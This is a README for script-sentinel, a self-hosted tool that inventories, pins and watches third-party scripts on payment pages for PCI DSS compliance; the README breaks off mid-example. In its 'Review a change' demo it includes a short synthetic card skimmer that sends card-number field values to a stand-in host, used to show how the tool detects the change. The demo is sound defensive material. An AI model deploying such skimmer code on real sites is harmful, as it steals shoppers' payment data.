# script-sentinel

[![CI](https://github.com/xeeshan16/script-sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/xeeshan16/script-sentinel/actions/workflows/ci.yml)
![Python](https://img.shields.io/badge/python-3.12%20%7C%203.13-blue)
![License](https://img.shields.io/badge/license-MIT-green)

**Self-hosted integrity monitoring for the third-party scripts your pages load.**

A tag manager, an A/B testing snippet or a chat widget can change on the vendor's CDN with no
deploy on your side, and nothing tells you. When that vendor is compromised, the attacker's
code runs on your checkout page with your users' trust. script-sentinel keeps an inventory of
every script your pages load, pins what each one should look like, and tells you when one
changes and whether the change looks like a skimmer.

> **Status: in active development (day 5 of 14).** Scans fetch your pages, inventory every
> script they load, download and hash every script body, keep a version history per script,
> check `integrity` attributes the way a browser does, and snapshot each page's security
> headers. Every script is approved (with a written justification), rejected or pending,
> by hand or through origin, prefix and hash policies, and a vendor change sends a pinned
> script back to review. Each scan compares every script with what it served last time:
> new scripts and changed bodies become findings with a severity and a JS-aware token
> diff that names the hosts the new code talks to. Decisions, status changes and the
> handling of findings land in a hash-chained audit trail. See [docs/PLAN.md](docs/PLAN.md)
> for the roadmap and [docs/PROGRESS.md](docs/PROGRESS.md) for the daily log.

## Why

- **Supply-chain attacks through scripts are routine.** Magecart-style skimmers, crypto
  wallet-address swaps and injected tag-manager code all arrive from a CDN you already trust.
  Only monitoring the scripts themselves, or a strict Content Security Policy, catches them.
- **PCI DSS 4.0 made it mandatory.** Requirement 6.4.3 asks for an inventory of every script
  on payment pages, each authorized with a written justification and integrity-checked.
  Requirement 11.6.1 asks for tamper detection on those pages at least once every 7 days.
  The tools that cover this are mostly commercial SaaS.
- **CSP reports are noisy.** Violation reports arrive in two formats, in bursts, mostly as
  duplicates. They are useful only once deduplicated and aggregated.

## Features

| Area | What it does | Status |
| --- | --- | --- |
| Registry | Sites with an explicit origin allowlist and a scan interval (≤ 7 days); pages marked as payment pages are in PCI scope | ✅ day 1 |
| Allowlist | Browser-style origin normalization (case, IDNA, default ports, IPv6), exact matching, credentials in URLs refused | ✅ day 1 |
| Scanner | Fetches registered pages with timeouts, size caps, allowlist-checked redirects and RFC 9309 `robots.txt` handling; keeps a snapshot of every scan | ✅ day 2 |
| Inventory | Every script a browser would run, per page and in order: inline, external, module, import map, SVG and `data:` scripts, with `integrity`, `nonce`, `crossorigin` and `type` | ✅ day 2 |
| Versions | Every body (inline or external) hashed with SHA-384 over the exact bytes and over a comment- and whitespace-insensitive JS token stream; a version history per script, so a vendor change is a new version of the same script | ✅ day 3 |
| Integrity | `integrity` attributes checked the way browsers do (strongest algorithm wins); SRI values to pin each body; CSP hash sources for inline code; a warning for SRI on a cross-origin script without `crossorigin` | ✅ day 3 |
| Headers (11.6.1) | CSP, CSP-Report-Only, Integrity-Policy, HSTS, `X-Content-Type-Options` and other security headers, plus `<meta>` CSPs, snapshotted per page per scan | ✅ day 3 |
| Authorization (6.4.3) | Approve (pinned to the current bodies, or for any version) or reject each script with a written justification; origin, URL-prefix and hash policies, either pinned on first use or "expected to change"; cache-busting query parameters folded into one script; `scan run --fail-on-unauthorized` gates a pipeline on payment pages | ✅ day 4 |
| Audit trail | Every decision, policy change and status change, append-only and SHA-256 hash-chained per site, with a verifier that finds the first edited, removed or reordered event | ✅ day 4 |
| Change review | Every scan compares each script with what it served last time; a changed body (including going back to an old one) or a script new to an already-scanned page becomes a finding with a severity: a token diff that ignores comments and whitespace and stays fast on minified bundles, size and entropy deltas, and the hosts and URLs the new code references; inline blocks are matched by content, so inserting one doesn't shift the others | ✅ day 5 |
| Findings | Open, acknowledged or resolved (with a note), each step in the audit trail; `scan run --fail-on SEVERITY` gates a pipeline; `scripts diff` compares any two versions | ✅ day 5 |
| Skimmer heuristics | New exfiltration sinks, card-field listeners, wallet-address swaps, obfuscation, script injection | day 6 |
| CSP reports | `report-uri` and Reporting API collector with dedupe, rate limits, batch ingest and optional Kafka | days 7–8 |
| CSP builder | Policy suggestions from the approved inventory and observed reports | day 9 |
| Worker and alerts | Scheduled scans, advisory locks, transactional outbox, HMAC-signed webhooks | day 10 |
| Dynamic scripts | Optional headless-browser renderer for runtime-injected scripts | day 11 |
| Evidence | 6.4.3 / 11.6.1-style exports in JSON and Markdown; optional LLM diff explainer with a deterministic fake | day 12 |

## Architecture

```mermaid
flowchart LR
    subgraph API["FastAPI service"]
        sites["/v1/sites<br/>registry + allowlist"]
        csp["CSP report collector<br/>(day 7)"]
    end
    worker["Scan worker<br/>(day 10)"] --> scanner["Scanner<br/>fetch → parse → hash"]
    scans["/v1/sites/{name}/scans"] --> scanner
    scanner --> store[("PostgreSQL<br/>sites · pages · scripts<br/>versions · findings")]
    scanner --> policy["Authorization<br/>decisions · policies"]
    policy --> trail[("Audit trail<br/>hash-chained")]
    scanner --> diff["Change detection<br/>token diff · hosts · severity"]
    diff --> findings["Findings"] --> outbox["Outbox<br/>(day 10)"] --> hooks["Signed webhooks"]
    findings --> trail
    heur["Skimmer heuristics<br/>(day 6)"] -.-> diff
    sites --> store
    csp --> ingest["Buffered ingest<br/>(memory or Kafka)"] --> store
```

The data model today:

```mermaid
erDiagram
    SITE ||--o{ PAGE : has
    SITE ||--o{ SCRIPT : inventories
    SCRIPT ||--o{ SCRIPT_VERSION : "served bodies"
    SITE ||--o{ FINDING : raises
    SCRIPT |o--o{ FINDING : about
    SITE ||--o{ SCAN : "is scanned"
    SCAN ||--o{ PAGE_SNAPSHOT : records
    PAGE |o--o{ PAGE_SNAPSHOT : "snapshots of"
    PAGE_SNAPSHOT ||--o{ SCRIPT_OBSERVATION : saw
    SCRIPT ||--o{ SCRIPT_OBSERVATION : "observed as"
    SCRIPT_VERSION |o--o{ SCRIPT_OBSERVATION : "body seen"
    SCAN ||--o{ SCRIPT_FETCH : downloads
    SCRIPT ||--o{ SCRIPT_FETCH : "fetched as"
    SCRIPT_VERSION |o--o{ SCRIPT_FETCH : got
    SITE ||--o{ POLICY : "authorizes with"
    POLICY |o--o{ SCRIPT : "approved by"
    SITE ||--o{ AUTHORIZATION_EVENT : "audit trail"
    SCAN |o--o{ FINDING : raised
    SCRIPT_VERSION |o--o{ FINDING : "new body / previous body"
    SITE {
        uuid id
        string name
        json allowed_origins
        int scan_interval_hours "1..168"
        bool respect_robots
    }
    SCAN {
        enum status "running | completed | partial | failed"
        enum trigger "cli | api | schedule"
        int pages_ok
        int pages_skipped
        int pages_failed
        int scripts_new
        int scripts_changed
        int scripts_pending "after authorization"
        int findings_new
    }
    PAGE_SNAPSHOT {
        enum outcome "ok | robots_disallowed | http_error | ..."
        string final_url
        string body_sha384
        json warnings
        json security_headers
        json meta_csp
    }
    SCRIPT_OBSERVATION {
        int position
        enum script_type "classic | module | importmap"
        string integrity
        string nonce_digest "never the nonce itself"
        string inline_sha384
        enum sri_status "match | mismatch | no_supported_hash | unverified"
        enum authorization_status "status when the scan finished"
    }
    SCRIPT_FETCH {
        enum outcome "ok | http_error | too_large | ..."
        int http_status
        string final_url
        bool new_version
    }
    PAGE {
        string url "on an allowed origin"
        bool payment_page
    }
    SCRIPT {
        enum kind "external | inline"
        string locator "src URL, or page + position"
        enum status "pending | approved | rejected (derived)"
        enum decision "approved | rejected | null"
        enum approval_scope "pinned | any_version"
        text justification
        string status_reason
        json current_version_ids
    }
    SCRIPT_VERSION {
        string sha384 "unique per script"
        string normalized_sha384
        int size_bytes
        text content
        string approved_by "person or policy"
    }
    POLICY {
        enum kind "origin | prefix | hash"
        string match
        enum change "pinned | expected_to_change"
        json ignore_query "cache busters"
        text justification
    }
    AUTHORIZATION_EVENT {
        int seq "per site"
        string action
        string actor
        string from_status
        string to_status
        string prev_hash
        string hash "sha256 of the event"
    }
    FINDING {
        string kind "script.added | script.changed | script.reformatted"
        enum severity "info | low | medium | high | critical"
        enum status "open | acknowledged | resolved"
        string locator "kept if the script is deleted"
        json detail "reasons, diff, size/entropy, new hosts and URLs"
        string status_changed_by
        text status_note
    }
```

Design notes:

- **Only listed origins are scanned.** A page can't be registered unless its origin is on the
  site's allowlist, and an origin can't be removed while pages use it.
- **A changed script is a new version, not a new script.** Scripts are identified by a locator
  within their site, so history and approvals follow the script across body changes.
- **The scanner stays on the allowlist.** Redirects are followed by hand and every hop must
  be on an allowed origin; a page that redirects elsewhere is reported as `redirect_blocked`.
  Third-party script URLs are fetched only as scripts, never as pages.
- **No half-parsed pages.** A page over `SENTINEL_MAX_PAGE_BYTES` is reported as `too_large`
  instead of being parsed up to the cut, which would silently hide the scripts after it.
- **robots.txt per RFC 9309,** including wildcards and longest-match precedence (which
  Python's `urllib.robotparser` lacks): 4xx means no rules, 5xx or unreachable means
  disallow everything. Checkout pages are often disallowed for crawlers, so a site can opt
  out for its own pages with `--ignore-robots`; a robots refusal counts as skipped, not
  failed, and the CLI warns when it kept a payment page out of a scan.
- **What a browser would run, not every `<script>` tag.** Script types follow the HTML
  standard (`application/ld+json` and other data blocks never run; import maps are kept
  because they control where modules load from), `<base href>` changes resolution, scripts in
  `<template>` and `<noscript>` are skipped, SVG scripts are read from `href`, and `data:`
  URLs are treated as inline code. Anything that can't be inventoried becomes a warning on
  the snapshot instead of disappearing.
- **No database transaction is held across the network.** A scan fetches first, then writes
  the scan, its snapshots and the inventory in one go.
- **Two hashes per body.** `sha384` covers the exact bytes (what Subresource Integrity
  checks). `normalized_sha384` covers the body's JavaScript tokens with comments dropped and
  whitespace collapsed (line breaks kept, because automatic semicolon insertion makes them
  meaningful), so a rebuild that only changed a banner comment or `sourceMappingURL` can be
  told apart from a change in the code. The tokenizer handles strings, template literals
  with nested substitutions, regex-versus-division and unterminated input, and is the base
  for the token diff.
- **Integrity checked like a browser.** Only the strongest algorithm in an `integrity`
  attribute counts (`sha256-<good> sha384-<bad>` fails), unusable values mean the script
  runs unchecked (reported as `no_supported_hash`), and digests are compared exactly. SRI
  on a cross-origin script without `crossorigin` is flagged, because browsers refuse to run
  it.
- **Script bodies are fetched once per scan, off the event loop.** Every external script
  the pages reference is downloaded once (redirects to any http(s) URL are followed, as a
  browser would; robots.txt doesn't apply to subresources), capped at
  `SENTINEL_MAX_SCRIPT_BYTES`, and hashed in a worker thread.
- **Stored third-party code never runs on the sentinel's origin.** Version bodies are served
  as `text/plain` with `nosniff` and a sandboxing CSP.
- **Status is derived, never set.** A script's status comes from a person's decision, the
  site's policies and the bodies it serves right now, in that order: a rejection always
  wins; an approval is either *pinned* to the bodies that were reviewed or for *any
  version*; without a decision a hash policy approves exact bodies, then the most specific
  origin or prefix policy applies. A per-script pin is deliberate, so a broad "expected to
  change" origin policy doesn't override it. Statuses are recomputed after every scan,
  decision and policy change.
- **Pinned means pinned.** A pinned approval or a pinning policy covers the exact SHA-384 of
  the bodies approved. When the vendor ships a new body the script is `pending` again, and
  going back to an approved body makes it `approved` again. A pinning policy trusts the
  first body it sees (trust on first use) and records which one. A failed fetch never
  changes a status: the script keeps the bodies it last served successfully.
- **One script per vendor file, not per cache buster.** Origin and prefix policies can drop
  query parameters (`ignore_query: ["v"]`, or `["*"]`) before a URL becomes a locator, so
  `tag.js?v=123` and `tag.js?v=124` are two versions of one script. The remaining
  parameters keep their order and exact encoding. Prefixes always end in a path, so
  `https://cdn.vendor.com/` can't match `https://cdn.vendor.com.evil.test/`.
- **A tamper-evident audit trail.** Each event stores the SHA-256 of the previous event and
  of its own canonical JSON, numbered per site; appends lock the site row
  (`SELECT … FOR UPDATE`) so concurrent writers can't fork the chain. Events keep plain ids
  (not foreign keys) because the hash covers them, and they outlive the scripts and
  policies they mention. `sentinel audit verify` reports the first event that was edited,
  removed or reordered. Someone with database write access could rebuild the whole chain,
  so the head hash is worth keeping elsewhere; day 12's evidence export does that.
- **Scans record what was authorized at the time.** Each script observation keeps its
  status as of the end of that scan, so old scans stay accurate evidence after later
  decisions.
- **A change is measured against the last scan, not against history.** Each script keeps
  the bodies it served on its last successful fetch; a scan reports any body outside that
  set, so a vendor that flips back to an old build is reported too (as `low`, "went back to
  an earlier body"). Each new body is diffed against the closest previous one (same
  normalized hash first, then the most similar).
- **A token diff that stays bounded.** Common prefixes and suffixes are trimmed first;
  small middles go to `difflib` token by token, large ones get a patience diff anchored on
  tokens that occur once on each side, with a work budget. Past the budget the rest is
  reported as whole replacements and the result is marked `coarse`. In one local
  measurement, a 1.4 MB synthetic bundle with two edits was analyzed in about 2 s, and a
  fully shuffled copy in about 2.4 s; a statement-level `difflib` alignment tried first
  didn't finish that one within 100 s.
- **New hosts, not just new code.** URLs in string and template literals are extracted
  (escapes like `\/` and `\x2f` undone, protocol-relative `//host` included), and a body
  that references a host its previous version didn't is `high` severity. URLs built at
  runtime are the skimmer heuristics' job (day 6).
- **Inline identity follows content.** Inline blocks are matched against the page's known
  blocks by exact body, normalized body, token similarity (at least 0.6) and only then by
  position, so a new snippet in front of the others is one new script instead of every
  block after it "changing".
- **Findings outlive the scripts they're about.** Deleting a script sets the reference on its
  findings to `NULL` instead of deleting them; they are audit evidence.
- **Portable schema.** Enums are `VARCHAR` + `CHECK`, JSON is `JSONB` on PostgreSQL, and
  timestamps are timezone-aware UTC on both PostgreSQL and SQLite. A test asserts the ORM
  models and the hand-written migrations match. SQLite migrations run with foreign keys
  off (as SQLite's own guide for table rebuilds says) and end with
  `PRAGMA foreign_key_check`, and a test checks that rebuilding `scripts` keeps the rows
  that reference it.

## Quick start

Requires Python 3.12+ and [uv](https://docs.astral.sh/uv/). PostgreSQL 16 for real use;
SQLite works for trying it out.

```bash
git clone https://github.com/xeeshan16/script-sentinel.git
cd script-sentinel
uv sync

# PostgreSQL (or: export SENTINEL_DATABASE_URL=sqlite+aiosqlite:///sentinel.db)
export SENTINEL_DATABASE_URL=postgresql+asyncpg://sentinel:sentinel@localhost:5432/sentinel
uv run sentinel db upgrade      # prints: database upgraded to head
```

Register a site, the origins its pages may be fetched from, and the pages to scan:

```console
$ uv run sentinel sites add shop --origin https://shop.example.com --origin http://localhost:8000
added site shop: http://localhost:8000, https://shop.example.com (scan every 168h)
$ uv run sentinel pages add shop https://shop.example.com/checkout --payment --label checkout
added page https://shop.example.com/checkout (payment page)
$ uv run sentinel pages add shop https://cdn.vendor.test/
error: https://cdn.vendor.test/ is not on an allowed origin of site 'shop' (http://localhost:8000, https://shop.example.com)
$ uv run sentinel sites list
shop                 pages=1    payment=1    every 168h  http://localhost:8000, https://shop.example.com
```

### Scan a site

[`examples/`](examples) holds a small synthetic shop and the "third-party" CDN it loads
scripts from, on two local origins. The shop's `robots.txt` disallows `/checkout`, as many
real shops do. Serve both and register the shop:

```bash
python examples/serve.py &    # shop on 127.0.0.1:8000, CDN on 127.0.0.1:8001
uv run sentinel sites add demo --origin http://127.0.0.1:8000
uv run sentinel pages add demo http://127.0.0.1:8000/index.html --label home
uv run sentinel pages add demo http://127.0.0.1:8000/checkout.html --payment --label checkout
```

```console
$ uv run sentinel scan run demo
scan 315560ae-c208-4bb8-8e3e-b5cd0e8c9057 of demo: completed in 0.10s (2 pages: 1 ok, 1 skipped)
  robots   http://127.0.0.1:8000/checkout.html [payment]  disallowed by robots.txt (parsed)
  ok       http://127.0.0.1:8000/index.html  200  3 scripts (3 new)
      headers: nosniff, Referrer-Policy
      + http://127.0.0.1:8000/js/app.js  (classic, pending)  sha384-oaeGFW/oKjuWczG…
      + http://127.0.0.1:8001/analytics/v2/tag.js  (classic, pending)  sha384-raygKpbLnYdKgM3…
      + http://127.0.0.1:8000/index.html#inline-1  (classic, pending)  sha384-uSDeh2gpqss7OOr…
inventory: 3 scripts seen, 3 new
authorization: 0 approved, 3 pending, 0 rejected
bodies: 2 external fetched, 0 failed; 3 new versions, 0 scripts changed
warning: robots.txt kept payment pages out of this scan; if they are your own pages, run: sentinel sites update demo --ignore-robots
$ uv run sentinel sites update demo --ignore-robots
updated site demo: scan every 168h, robots.txt ignored
$ uv run sentinel scan run demo --fail-on-unauthorized
scan ea5b83a1-5905-4612-9e4c-d73d04cad72e of demo: completed in 0.09s (2 pages: 2 ok)
  ok       http://127.0.0.1:8000/checkout.html [payment]  200  6 scripts (4 new)
      headers: CSP report-only, nosniff, Referrer-Policy
      + http://127.0.0.1:8000/checkout.html#inline-1  (classic, pending, nonce)  sha384-lXDOInm1aF5PqqU…
      + http://127.0.0.1:8000/checkout.html#inline-2  (importmap, pending)  sha384-RK3hVJoVsFjKTgJ…
        http://127.0.0.1:8000/js/app.js  (classic, pending)  sha384-oaeGFW/oKjuWczG…
        http://127.0.0.1:8001/analytics/v2/tag.js  (classic, pending)  sha384-raygKpbLnYdKgM3…
      + http://127.0.0.1:8001/payments/v3/elements.js  (classic, pending, integrity ok)  sha384-i+C8D+bUmsEtpaC…
      + http://127.0.0.1:8000/js/checkout.mjs  (module, pending)  sha384-V9XBxb1rMJcHI5I…
  ok       http://127.0.0.1:8000/index.html  200  3 scripts
      headers: nosniff, Referrer-Policy
        http://127.0.0.1:8000/js/app.js  (classic, pending)  sha384-oaeGFW/oKjuWczG…
        http://127.0.0.1:8001/analytics/v2/tag.js  (classic, pending)  sha384-raygKpbLnYdKgM3…
        http://127.0.0.1:8000/index.html#inline-1  (classic, pending)  sha384-uSDeh2gpqss7OOr…
inventory: 7 scripts seen, 4 new
authorization: 0 approved, 7 pending, 0 rejected
bodies: 4 external fetched, 0 failed; 4 new versions, 0 scripts changed
warning: payment pages run 6 scripts that are not approved (PCI DSS 6.4.3); review them with: sentinel scripts list demo
$ echo $?
4
$ uv run sentinel scripts list demo
pending   external  v1   sha384-oaeGFW/oKjuWczG…   http://127.0.0.1:8000/js/app.js
pending   external  v1   sha384-V9XBxb1rMJcHI5I…   http://127.0.0.1:8000/js/checkout.mjs
pending   external  v1   sha384-raygKpbLnYdKgM3…   http://127.0.0.1:8001/analytics/v2/tag.js
pending   external  v1   sha384-i+C8D+bUmsEtpaC…   http://127.0.0.1:8001/payments/v3/elements.js
pending   inline    v1   sha384-lXDOInm1aF5PqqU…   http://127.0.0.1:8000/checkout.html#inline-1
pending   inline    v1   sha384-RK3hVJoVsFjKTgJ…   http://127.0.0.1:8000/checkout.html#inline-2
pending   inline    v1   sha384-uSDeh2gpqss7OOr…   http://127.0.0.1:8000/index.html#inline-1
```

`+` marks a script seen for the first time. Every new script starts as `pending`: under PCI
DSS 6.4.3 each script on a payment page needs an authorization and a written
justification. With `--fail-on-unauthorized`, `scan run` exits 4 while a payment page runs
anything that isn't approved, so it can gate a deploy or a cron job. The checkout page pins
the payments library with SRI, and the scan confirms a browser would accept the body it got
(`integrity ok`). The JSON `application/ld+json` block on the checkout page is counted but
not inventoried, because it never runs.

### Authorize scripts (PCI DSS 6.4.3)

Approve first-party code by origin, pin the payment library by hand, let the analytics
vendor's first body be pinned by a policy, and approve the inline blocks one by one. Who
did it comes from `--actor`, `SENTINEL_ACTOR` or the login name:

```console
$ export SENTINEL_ACTOR=zeeshan
$ uv run sentinel policies add demo --origin http://127.0.0.1:8000 --expected-to-change \
    -j "First-party code, shipped by our own pipeline"
added policy bf7054aa-f9b1-4d4d-a03e-56c2ebe580d0: origin policy http://127.0.0.1:8000
  pending -> approved: http://127.0.0.1:8000/js/app.js  (approved by origin policy http://127.0.0.1:8000 (expected to change))
  pending -> approved: http://127.0.0.1:8000/js/checkout.mjs  (approved by origin policy http://127.0.0.1:8000 (expected to change))
$ uv run sentinel scripts approve demo http://127.0.0.1:8001/payments/v3/elements.js \
    -j "PSP card fields; required to take payments"
approved: http://127.0.0.1:8001/payments/v3/elements.js
  why: approved by zeeshan
$ uv run sentinel policies add demo --prefix http://127.0.0.1:8001/analytics/ \
    -j "Analytics tag; every new version needs a review"
added policy 037b1087-f17d-4053-8267-b0f8d7d994fa: prefix policy http://127.0.0.1:8001/analytics/
  pending -> approved: http://127.0.0.1:8001/analytics/v2/tag.js  (approved by prefix policy http://127.0.0.1:8001/analytics/, pinned to the first body seen)
$ uv run sentinel scripts approve demo 'http://127.0.0.1:8000/checkout.html#inline-1' \
    -j "Checkout config: currency and locale"
approved: http://127.0.0.1:8000/checkout.html#inline-1
  why: approved by zeeshan
$ # ...and the same for checkout.html#inline-2 (the import map) and index.html#inline-1
$ uv run sentinel scan run demo --fail-on-unauthorized | tail -3
inventory: 7 scripts seen, 0 new
authorization: 7 approved, 0 pending, 0 rejected
bodies: 4 external fetched, 0 failed; 0 new versions, 0 scripts changed
```

`scripts approve` pins the bodies the script serves now; `--any-version` approves whatever
the vendor serves. `scripts reject` overrides every policy, and `scripts reset` withdraws a
decision. `policies add --hash` approves one exact body wherever it appears (inline code
included), and `--ignore-query v` on an origin or prefix policy folds `tag.js?v=123` and
`tag.js?v=124` into one script.

### When a vendor changes a script

Now play the vendor: the analytics tag on the CDN changes, with no deploy on the shop's side.

```console
$ echo 'queue.push(["ping"]);' >> examples/fixture-cdn/analytics/v2/tag.js
$ uv run sentinel scan run demo --fail-on-unauthorized
scan 95e29288-b46a-4ec5-8f13-dd8e13db0a48 of demo: completed in 0.08s (2 pages: 2 ok)
  ok       http://127.0.0.1:8000/checkout.html [payment]  200  6 scripts
      headers: CSP report-only, nosniff, Referrer-Policy
        http://127.0.0.1:8000/checkout.html#inline-1  (classic, approved, nonce)  sha384-lXDOInm1aF5PqqU…
        http://127.0.0.1:8000/checkout.html#inline-2  (importmap, approved)  sha384-RK3hVJoVsFjKTgJ…
        http://127.0.0.1:8000/js/app.js  (classic, approved)  sha384-oaeGFW/oKjuWczG…
      ~ http://127.0.0.1:8001/analytics/v2/tag.js  (classic, pending)  sha384-5R5tM2xxeboPVK+…
        http://127.0.0.1:8001/payments/v3/elements.js  (classic, approved, integrity ok)  sha384-i+C8D+bUmsEtpaC…
        http://127.0.0.1:8000/js/checkout.mjs  (module, approved)  sha384-V9XBxb1rMJcHI5I…
  ok       http://127.0.0.1:8000/index.html  200  3 scripts
      headers: nosniff, Referrer-Policy
        http://127.0.0.1:8000/js/app.js  (classic, approved)  sha384-oaeGFW/oKjuWczG…
      ~ http://127.0.0.1:8001/analytics/v2/tag.js  (classic, pending)  sha384-5R5tM2xxeboPVK+…
        http://127.0.0.1:8000/index.html#inline-1  (classic, approved)  sha384-uSDeh2gpqss7OOr…
inventory: 7 scripts seen, 0 new
authorization: 6 approved, 1 pending, 0 rejected
bodies: 4 external fetched, 0 failed; 1 new versions, 1 scripts changed
warning: payment pages run 1 scripts that are not approved (PCI DSS 6.4.3); review them with: sentinel scripts list demo
findings: 1 (review with: sentinel findings show ID)
  MEDIUM   0fa6fe9a-2b42-4920-886b-1ebf64448621  Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
           the code changed; runs on a payment page
$ echo $?
4
$ uv run sentinel scripts show demo http://127.0.0.1:8001/analytics/v2/tag.js
http://127.0.0.1:8001/analytics/v2/tag.js
  kind: external   status: pending
  why: the body changed since prefix policy http://127.0.0.1:8001/analytics/ pinned it
  seen: 2026-11-25 10:30:13Z .. 2026-11-25 10:30:19Z
  versions (2, most recently seen first):
    2026-11-25 10:30:19Z       231 bytes  sha384-5R5tM2xxeboPVK+WaFsUzTA2YwHEgRK/wn7ptQQByydFrdEChhOQ1FYewCG6Zj52
    2026-11-25 10:30:18Z       209 bytes  sha384-raygKpbLnYdKgM3/yZTB+rNJEmEUx75tgDCpLy3OMpv6OlnikQK3g4yXoPd2vFCD  approved by policy:230e9caf-d6aa-49b2-84ee-a7820fa983ae
  pin the current body with:
    <script src="http://127.0.0.1:8001/analytics/v2/tag.js" integrity="sha384-5R5tM2xxeboPVK+WaFsUzTA2YwHEgRK/wn7ptQQByydFrdEChhOQ1FYewCG6Zj52" crossorigin="anonymous"></script>
$ uv run sentinel audit list demo --script http://127.0.0.1:8001/analytics/v2/tag.js
#17   2026-11-25 10:30:19Z  script.status_changed scan             approved -> pending   http://127.0.0.1:8001/analytics/v2/tag.js
      the body changed since prefix policy http://127.0.0.1:8001/analytics/ pinned it
#13   2026-11-25 10:30:16Z  script.status_changed zeeshan          pending -> approved   http://127.0.0.1:8001/analytics/v2/tag.js
      approved by prefix policy http://127.0.0.1:8001/analytics/, pinned to the first body seen
#3    2026-11-25 10:30:13Z  script.status_changed scan             new -> pending        http://127.0.0.1:8001/analytics/v2/tag.js
      no decision or policy covers this script yet
$ uv run sentinel audit verify demo
audit trail of demo is intact: 17 events, head d3787f6481354293c27763f3340f3c1242fa51d36b98c97775b6b2c05020e0af
$ uv run sentinel scripts show demo 'http://127.0.0.1:8000/checkout.html#inline-1' | tail -1
  CSP hash source for the current body: 'sha384-lXDOInm1aF5PqqUrDg5CaId7/zhFcRp49CafOH2uDqHBYq9Cjkh80E/lvWCymFNd'
```

`~` marks a script whose body changed: same script, new version. The prefix policy pinned
the first body, so the new one is `pending` until someone looks at it (approving it again,
or `--any-version` if the vendor is trusted to change it), and the scan fails the gate.
The change is also a finding: `low` for a code change, raised to `medium` because the tag
runs on a payment page. `sentinel scan run` also exits 3 when any page could not be
inventoried; `--json` prints the whole scan, including each page's security headers, every
script fetch, each script's authorization status and the findings.

### Review a change

Now the vendor is compromised, and the tag starts sending card numbers to a host it never
talked to before. `skim.js` is a synthetic stand-in:

```js
document.addEventListener("change", function (e) {
  if (e.target.name === "cardnumber") navigator.sendBeacon("https://collect.example-cdn.test/c", e.target.value);
});
```

The finding says what changed, where it runs and why it is `critical`, and shows the
tokens that were added:

```console
$ cat skim.js >> examples/fixture-cdn/analytics/v2/tag.js    # the vendor is compromised
$ uv run sentinel scan run demo --fail-on high
…
findings: 1 (review with: sentinel findings show ID)
  CRITICAL ee5833e7-145d-4ddd-8ba7-a784583d2029  Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
$ echo $?
5
$ uv run sentinel findings show ee5833e7-145d-4ddd-8ba7-a784583d2029
finding ee5833e7-145d-4ddd-8ba7-a784583d2029 (demo): script.changed, open
  CRITICAL Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
  pages [payment]: http://127.0.0.1:8000/checkout.html, http://127.0.0.1:8000/index.html
  size: 231 -> 400 bytes (+169)   entropy: 5.02 -> 5.02 bits/char (+0.00)
  tokens: -0 +37 of 56 -> 93 (similarity 75%)
  new hosts: collect.example-cdn.test
  new URLs: https://collect.example-cdn.test/c
@@ line 7 -> line 7 @@
  … ( [ "ping" ] ) ;
+ document . addEventListener ( "change" , function ( e ) {
+ if ( e . target . name === "cardnumber" ) navigator . sendBeacon ( "https://collect.example-cdn.test/c" , e . target . value ) ;
+ } ) ;
$ uv run sentinel scripts diff demo http://127.0.0.1:8001/analytics/v2/tag.js --from sha384-raygKpbL
http://127.0.0.1:8001/analytics/v2/tag.js
  from sha384-raygKpbLnYdKgM3/yZTB+rNJEmEUx75tgDCpLy3OMpv6OlnikQK3g4yXoPd2vFCD  (first seen 2026-11-25 10:30Z)
  to   sha384-C9HItuTAqj2KTcNQcbdVkXaXTUx7KHGGC86Sxg8TlFAWrJYYGK9JNwE5f/abopwL  (first seen 2026-11-25 10:30Z)
  size: 209 -> 400 bytes (+191)   entropy: 4.99 -> 5.02 bits/char (+0.03)
  tokens: -0 +46 of 47 -> 93 (similarity 67%)
  new hosts: collect.example-cdn.test
  new URLs: https://collect.example-cdn.test/c
@@ line 6 -> line 6 @@
  … ( window , document ) ;
+ queue . push ( [ "ping" ] ) ;
+ document . addEventListener ( "change" , function ( e ) {
+ if ( e . target . name === "cardnumber" ) navigator . sendBeacon ( "https://collect.example-cdn.test/c" , e . target . value ) ;
+ } ) ;
$ uv run sentinel findings ack ee5833e7-145d-4ddd-8ba7-a784583d2029
finding ee5833e7-145d-4ddd-8ba7-a784583d2029 is now acknowledged
$ uv run sentinel findings resolve ee5833e7-145d-4ddd-8ba7-a784583d2029
error: resolving a finding needs a note saying what was done
$ uv run sentinel findings resolve ee5833e7-145d-4ddd-8ba7-a784583d2029 -n "Vendor compromise: tag removed from checkout, vendor notified"
finding ee5833e7-145d-4ddd-8ba7-a784583d2029 is now resolved
$ uv run sentinel findings list demo
2026-11-25 10:30:23Z  resolved     ee5833e7-145d-4ddd-8ba7-a784583d2029
  CRITICAL Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
2026-11-25 10:30:19Z  open         0fa6fe9a-2b42-4920-886b-1ebf64448621
  MEDIUM   Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
           the code changed; runs on a payment page
$ uv run sentinel audit list demo --limit 2
#19   2026-11-25 10:30:26Z  finding.resolved      zeeshan          acknowledged -> resolved http://127.0.0.1:8001/analytics/v2/tag.js
      Vendor compromise: tag removed from checkout, vendor notified
#18   2026-11-25 10:30:25Z  finding.acknowledged  zeeshan          open -> acknowledged  http://127.0.0.1:8001/analytics/v2/tag.js
```

The diff works on JavaScript tokens, so a 300 KB one-line bundle diffs down to the tokens
that changed, and comment or whitespace-only rebuilds are reported as `script.reformatted`
(`info`) rather than changes. Severity starts at `low` for a code change, goes to `medium`
when the script grows by more than half or its entropy jumps (packing and obfuscation do
both), to `high` when it references a host the previous body didn't, and one level up on a
payment page. `--fail-on high` exits 5 when the scan raised anything that severe; it wins
over `--fail-on-unauthorized` (4) and an incomplete scan (3). Resolving a finding needs a
note, and every step lands in the audit trail next to the authorization events.

Inline scripts have no URL, so they are identified by page and position. To keep that
stable, a scan first matches each inline block with the page's known blocks by exact body,
then by normalized body, then by token similarity, and only then by position. Adding an
A/B-test snippet in front of the checkout's config makes one new script, not three changed
ones:

```console
$ # an A/B-test snippet is added in front of the checkout's inline config
$ uv run sentinel scan run demo
scan d22b1a0e-dfdb-44a2-ac96-1d44dee70cdb of demo: completed in 0.07s (2 pages: 2 ok)
